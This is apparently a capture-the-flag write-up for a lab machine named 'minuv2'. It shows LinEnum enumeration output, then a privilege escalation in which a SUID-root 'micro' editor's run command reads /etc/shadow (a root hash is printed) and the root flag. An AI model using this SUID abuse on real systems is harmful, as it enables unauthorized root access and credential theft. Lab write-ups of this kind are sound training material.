+Linux version 4.19.58-0-virt (buildozer@build-3-10-x86_64) (gcc version 8.3.0 (Alpine 8.3.0)) #1-Alpine SMP Wed Jul 10 13:00:23 UTC 2019
+
+
+[-] Specific release information:
+3.10.1
+NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.10.1
+PRETTY_NAME="Alpine Linux v3.10"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://bugs.alpinelinux.org/"
+
+
+[-] Hostname:
+minuv2
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1000(employee) gid=1000(employee) groups=1000(employee)
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon),3(sys)
+uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),2(daemon),4(adm)
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys),4(adm),6(disk)
+uid=4(lp) gid=7(lp) groups=7(lp),7(lp)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=8(mail) gid=12(mail) groups=12(mail),12(mail)
+uid=9(news) gid=13(news) groups=13(news),13(news)
+uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=13(man) gid=15(man) groups=15(man),15(man)
+uid=14(postmaster) gid=12(mail) groups=12(mail)
+uid=16(cron) gid=16(cron) groups=16(cron),16(cron)
+uid=21(ftp) gid=21(ftp) groups=21(ftp)
+uid=22(sshd) gid=22(sshd) groups=22(sshd)
+uid=25(at) gid=25(at) groups=25(at),25(at)
+uid=31(squid) gid=31(squid) groups=31(squid),31(squid)
+uid=33(xfs) gid=33(xfs) groups=33(xfs),33(xfs)
+uid=35(games) gid=35(games) groups=35(games),100(users)
+uid=70(postgres) gid=70(postgres) groups=70(postgres)
+uid=85(cyrus) gid=12(mail) groups=12(mail)
+uid=89(vpopmail) gid=89(vpopmail) groups=89(vpopmail)
+uid=123(ntp) gid=123(ntp) groups=123(ntp)
+uid=209(smmsp) gid=209(smmsp) groups=209(smmsp),209(smmsp)
+uid=405(guest) gid=100(users) groups=100(users)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=100(chrony) gid=101(chrony) groups=101(chrony),101(chrony)
+uid=1000(employee) gid=1000(employee) groups=1000(employee)
+
+
+ash: gid=0(root): unknown operand
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
+employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash
+
+
+[-] Super user account(s):
+root
+
+
+[+] We can read root's home directory!
+total 0      
+
+
+[-] Are permissions on /home directories lax:
+total 3K     
+drwxr-xr-x    3 root     root        1.0K Jul 16  2019 .
+drwxr-xr-x   22 root     root        1.0K Jul 16  2019 ..
+drwxr-sr-x    4 employee employee    1.0K Jan 20 00:35 employee
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+MAIL=/var/mail/employee
+USER=employee
+SSH_CLIENT=192.168.1.29 58226 22
+SHLVL=2
+HOME=/home/employee
+OLDPWD=/home/employee/public
+SSH_TTY=/dev/pts/0
+PAGER=less
+PS1=\h:\w\$ 
+LOGNAME=employee
+TERM=xterm-256color
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+SHELL=/bin/ash
+PWD=/home/employee
+SSH_CONNECTION=192.168.1.29 58226 192.168.1.50 22
+CHARSET=UTF-8
+
+
+ls: /usr/local/sbin: No such file or directory
+
+[-] Path information:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+drwxr-xr-x    2 root     root          3072 Jul 16  2019 /bin
+drwxr-xr-x    2 root     root          5120 Jul 16  2019 /sbin
+drwxr-xr-x    2 root     root          8192 Jul 17  2019 /usr/bin
+drwxr-xr-x    2 root     root          1024 Jul 16  2019 /usr/local/bin
+drwxr-xr-x    2 root     root          1024 Jul 16  2019 /usr/sbin
+
+
+[-] Available shells:
+# valid login shells
+/bin/sh
+/bin/ash
+
+
+[-] Current umask value:
+0022
+u=rwx,g=rx,o=rx
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+total 6
+drwxr-xr-x    2 root     root          1024 Jul 16  2019 .
+drwxr-xr-x   26 root     root          3072 Jan 20 00:34 ..
+-rw-------    1 root     employee        35 Jul 16  2019 employee
+-rw-------    1 root     root           283 Jun 17  2019 root
+
+
+[-] Anything interesting in /var/spool/cron/crontabs:
+lrwxrwxrwx    1 root     root            13 Jul 16  2019 /var/spool/cron/crontabs -> /etc/crontabs
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0      Link encap:Ethernet  HWaddr 08:00:27:2F:C5:A5  
+          inet addr:192.168.1.50  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe2f:c5a5/64 Scope:Link
+          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe2f:c5a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:605918 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4182872 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:67857047 (64.7 MiB)  TX bytes:5841268665 (5.4 GiB)
+
+eth1      Link encap:Ethernet  HWaddr 08:00:27:BE:96:89  
+          inet addr:172.28.128.6  Bcast:0.0.0.0  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:febe:9689/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:20 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:36 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:7030 (6.8 KiB)  TX bytes:5518 (5.3 KiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:216 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:216 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:15632 (15.2 KiB)  TX bytes:15632 (15.2 KiB)
+
+[-] ARP history:
+? (192.168.1.29) at f4:5c:89:c9:be:c5 [ether]  on eth0
+? (172.28.128.2) at 08:00:27:45:9c:9a [ether]  on eth1
+? (192.168.1.21) at 08:00:27:1f:30:76 [ether]  on eth0
+? (192.168.1.67) at 08:00:27:1f:30:76 [ether]  on eth0
+
+
+[-] Default route:
+default         192.168.1.254   0.0.0.0         UG    202    0        0 eth0
+
+
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      2012/main-static
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 :::22                   :::*                    LISTEN      -
+
+
+[-] Listening UDP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 127.0.0.1:323           0.0.0.0:*                           -
+udp        0      0 ::1:323                 :::*                                -
+
+
+### SERVICES #############################################
+[-] Running processes:
+PID   USER     TIME  COMMAND
+    1 root      0:00 /sbin/init
+    2 root      0:00 [kthreadd]
+    3 root      0:00 [rcu_gp]
+    4 root      0:00 [rcu_par_gp]
+    6 root      0:00 [kworker/0:0H-kb]
+    8 root      0:00 [mm_percpu_wq]
+    9 root      0:00 [ksoftirqd/0]
+   10 root      0:00 [rcu_sched]
+   11 root      0:00 [rcu_bh]
+   12 root      0:00 [migration/0]
+   13 root      0:03 [kworker/0:1-eve]
+   14 root      0:00 [cpuhp/0]
+   15 root      0:00 [kdevtmpfs]
+   16 root      0:00 [netns]
+   17 root      0:00 [kauditd]
+   20 root      0:00 [oom_reaper]
+   21 root      0:00 [kworker/u2:2-ev]
+  182 root      0:00 [writeback]
+  183 root      0:00 [kcompactd0]
+  185 root      0:00 [ksmd]
+  186 root      0:00 [crypto]
+  187 root      0:00 [kintegrityd]
+  189 root      0:00 [kblockd]
+  247 root      0:00 [ata_sff]
+  257 root      0:00 [md]
+  263 root      0:00 [watchdogd]
+  368 root      0:00 [kswapd0]
+  478 root      0:00 [kthrotld]
+  499 root      0:00 [scsi_eh_0]
+  504 root      0:00 [scsi_tmf_0]
+  508 root      0:00 [scsi_eh_1]
+  519 root      0:00 [scsi_tmf_1]
+  522 root      0:00 [scsi_eh_2]
+  523 root      0:00 [scsi_tmf_2]
+  527 root      0:00 [kworker/u2:4-ev]
+  893 root      0:00 [kworker/0:2-ata]
+ 1035 root      0:00 [kworker/0:1H-kb]
+ 1036 root      0:00 [jbd2/sda3-8]
+ 1037 root      0:00 [ext4-rsv-conver]
+ 1436 root      0:00 [ttm_swap]
+ 1437 root      0:00 [irq/18-vmwgfx]
+ 1522 root      0:00 [ipv6_addrconf]
+ 1669 root      0:00 [jbd2/sda1-8]
+ 1670 root      0:00 [ext4-rsv-conver]
+ 1855 root      0:00 udhcpc -b -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:minuv2
+ 1873 root      0:00 udhcpc -b -p /var/run/udhcpc.eth1.pid -i eth1
+ 1903 root      0:00 /sbin/syslogd -t
+ 1957 root      0:00 /sbin/acpid
+ 1986 chrony    0:00 /usr/sbin/chronyd -f /etc/chrony/chrony.conf
+ 2011 root      0:00 /usr/sbin/crond -c /etc/crontabs
+ 2012 employee  0:36 /home/employee/main-static
+ 2044 root      0:00 /usr/sbin/sshd
+ 2048 root      0:00 /sbin/getty 38400 tty1
+ 2049 root      0:00 /sbin/getty 38400 tty2
+ 2053 root      0:00 /sbin/getty 38400 tty3
+ 2056 root      0:00 /sbin/getty 38400 tty4
+ 2060 root      0:00 /sbin/getty 38400 tty5
+ 2065 root      0:00 /sbin/getty 38400 tty6
+ 2735 root      0:00 sshd: employee [priv]
+ 2738 employee  0:00 sshd: employee@pts/0
+ 2739 employee  0:00 -ash
+ 2771 employee  0:00 ash LinEnum.sh
+ 2772 employee  0:00 ash LinEnum.sh
+ 2773 employee  0:00 tee -a
+ 2909 root      0:00 /sbin/getty -L 0 ttyS0 vt100
+ 2923 employee  0:00 ps aux
+
+
+[-] /etc/init.d/ binary permissions:
+total 117
+drwxr-xr-x    2 root     root          5120 Jul 16  2019 .
+drwxr-xr-x   26 root     root          3072 Jan 20 00:34 ..
+-rwxr-xr-x    1 root     root           244 May  3  2019 acpid
+-rwxr-xr-x    1 root     root          1218 Jun 10  2019 agetty
+-rwxr-xr-x    1 root     root           806 Jun 10  2019 binfmt
+-rwxr-xr-x    1 root     root          5899 Jun 10  2019 bootmisc
+-rwxr-xr-x    1 root     root          3519 Jun 10  2019 cgroups
+-rwxr-xr-x    1 root     root          1961 May 27  2019 chronyd
+-rwxr-xr-x    1 root     root          1769 Jun 10  2019 consolefont
+-rwxr-xr-x    1 root     root           175 May  3  2019 crond
+-rwxr-xr-x    1 root     root          3622 Jun 10  2019 devfs
+-rwxr-xr-x    1 root     root           747 Jun 10  2019 dmesg
+-rwxr-xr-x    1 root     root           196 May  3  2019 dnsd
+-rwxr-xr-x    1 root     root           703 Jun 10  2019 firstboot
+-rwxr-xr-x    1 root     root          3260 Jun 10  2019 fsck
+lrwxrwxrwx    1 root     root            23 Jul 16  2019 functions.sh -> /lib/rc/sh/functions.sh
+-rwxr-xr-x    1 root     root           269 Jun 10  2019 hostname
+-rwxr-xr-x    1 root     root           152 May  3  2019 httpd
+-rwxr-xr-x    1 root     root          3307 Jun 10  2019 hwclock
+-rwxr-xr-x    1 root     root           720 Jun 10  2019 hwdrivers
+-rwxr-xr-x    1 root     root           211 May  3  2019 inetd
+-rwxr-xr-x    1 root     root           798 Jun 10  2019 killprocs
+-rwxr-xr-x    1 root     root           209 May  3  2019 klogd
+-rwxr-xr-x    1 root     root           602 May  4  2019 kmod-static-nodes
+-rwxr-xr-x    1 root     root           289 May  3  2019 loadkmap
+-rwxr-xr-x    1 root     root          2752 Jun 10  2019 local
+-rwxr-xr-x    1 root     root          3701 Jun 10  2019 localmount
+-rwxr-xr-x    1 root     root          1013 Jun 10  2019 loopback
+-rwxr-xr-x    1 root     root           739 May  3  2019 mdev
+-rwxr-xr-x    1 root     root          3637 Jun 10  2019 modloop
+-rwxr-xr-x    1 root     root           536 Jun 10  2019 modules
+-rwxr-xr-x    1 root     root          1567 Jun 10  2019 mount-ro
+-rwxr-xr-x    1 root     root          1731 Jun 10  2019 mtab
+-rwxr-xr-x    1 root     root          2278 Jun 10  2019 net-online
+-rwxr-xr-x    1 root     root          2071 Jun 10  2019 netmount
+-rwxr-xr-x    1 root     root          1379 Jun 10  2019 networking
+-rwxr-xr-x    1 root     root           207 May  3  2019 ntpd
+-rwxr-xr-x    1 root     root          1119 Jun 10  2019 numlock
+-rwxr-xr-x    1 root     root           642 Jun 10  2019 osclock
+-rwxr-xr-x    1 root     root          1262 Jun 10  2019 procfs
+-rwxr-xr-x    1 root     root           253 May  3  2019 rdate
+-rwxr-xr-x    1 root     root          1420 Jun 10  2019 root
+-rwxr-xr-x    1 root     root          1110 Jun 10  2019 runsvdir
+-rwxr-xr-x    1 root     root          1030 Jun 10  2019 s6-svscan
+-rwxr-xr-x    1 root     root           865 Jun 10  2019 save-keymaps
+-rwxr-xr-x    1 root     root           987 Jun 10  2019 save-termencoding
+-rwxr-xr-x    1 root     root          1899 Jun 10  2019 savecache
+-rwxr-xr-x    1 root     root          2764 May  5  2019 sshd
+-rwxr-xr-x    1 root     root          2052 Jun 10  2019 staticroute
+-rwxr-xr-x    1 root     root          1037 Jun 10  2019 swap
+-rwxr-xr-x    1 root     root           960 Jun 10  2019 swclock
+-rwxr-xr-x    1 root     root          1674 Jun 10  2019 sysctl
+-rwxr-xr-x    1 root     root          3301 Jun 10  2019 sysfs
+-rwxr-xr-x    1 root     root          1257 Jun 10  2019 sysfsconf
+-rwxr-xr-x    1 root     root           269 May  3  2019 syslog
+-rwxr-xr-x    1 root     root          1457 Jun 10  2019 termencoding
+-rwxr-xr-x    1 root     root           174 May  3  2019 udhcpd
+-rwxr-xr-x    1 root     root          1383 Jun 10  2019 urandom
+-rwxr-xr-x    1 root     root           291 May  3  2019 watchdog
+
+
+### SOFTWARE #############################################
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/usr/bin/nc
+/usr/bin/wget
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r--    1 root     root          1343 Jul 16  2019 /etc/passwd
+-rw-r--r--    1 root     root           734 Jul 16  2019 /etc/group
+-rw-r--r--    1 root     root           279 Jun 17  2019 /etc/profile
+-rw-r-----    1 root     shadow         714 Jul 16  2019 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-x    1 root     root         19856 Jul 17  2019 /usr/bin/micro
+---s--x--x    1 root     root         14040 Jun 12  2019 /bin/bbsuid
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r--    1 root     root          4169 Jun 12  2019 /etc/udhcpd.conf
+-rw-r--r--    1 root     root          2973 May  3  2019 /etc/mdev.conf
+-rw-r--r--    1 root     root         12373 Jun 10  2019 /etc/rc.conf
+-rw-r--r--    1 root     root           846 May 29  2019 /etc/mke2fs.conf
+-rw-r--r--    1 root     root            53 Jun 17  2019 /etc/sysctl.conf
+-rw-r--r--    1 root     root          1996 Jul 16  2019 /etc/update-extlinux.conf
+-rw-r--r--    1 root     root           559 May 29  2019 /etc/e2scrub.conf
+-rw-r--r--    1 root     root             0 Jan 20 00:34 /etc/resolv.conf
+
+
+[-] Current user's history files:
+-rw-------    1 employee employee       403 Jan 20 00:36 /home/employee/.ash_history
+
+
+### SCAN COMPLETE ####################################
+
+--------------------------------------------------------------
+
+=> The binary "/usr/bin/micro" has the SUID permission bits (root).
+
+minuv2:~$ /usr/bin/micro
+
+minuv2:~$ cat /etc/passwd | /usr/bin/micro
+
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
+employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash
+
+
+========================================================================================================================================
+Step 4. Privilege escalation to root 
+========================================================================================================================================
+
+=> The binary "/usr/bin/micro" is owned by ROOT and has the SUID permission bits
+
+[-] SUID files:
+-rwsr-xr-x    1 root     root         19856 Jul 17  2019 /usr/bin/micro
+
+
+=> Micro is a terminal-based text editor that allows to execute OS commands.
+   We can directly run Linux commands as ROOT (because the micro program has SUID root permissions) -> Game Over !!
+   (https://github.com/zyedidia/micro/blob/master/runtime/help/commands.md)
+
+
+Step 1. Start 'micro'
+----------------------
+minuv2:/etc$ /usr/bin/micro
+
+
+Step 2. Within Micro, type the buttons "CTRL+E", then write "run cat shadow" and press enter
+---------------------------------------------------------------------------------------------
+-> The content of the file "shadow" is displayed by micro
+
+No name + (2,1) Unknown                                                                                                                                                                       F1 for help 
+root:$6$z50rUL037soKoaah$xCD9o693dC537Z7d60OeQKZ0qjjmDwYXuErlHdwh8vwhsEVC5FalTZF0ziEYVM0TyTfZUdYDXPQLi235JS2HN1:18093:0::::: bin:!::0::::: daemon:!::0::::: adm:!::0::::: lp:!::0::::: sync:!::0::::: shut
+
+
+Step 3. Display the flag ("run cat /root/flag.txt")
+---------------------------------------------------
+-> The content of the file "/root/flag.txt" is displayed :-)
+                                                                                                                                                                                                          
+No name (1,1) Unknown                                                                                                                                                                         F1 for help 
+        _                   ____     /\/\ (_)_ __  /\ /\__   _|___ \   /    \| | '_ \/ / \ \ \ / / __) | / /\/\ \ | | | \ \_/ /\ V / / __/  \/    \/_|_| |_|\___/  \_/ |_____|  # You got r00t!   flag{6d6
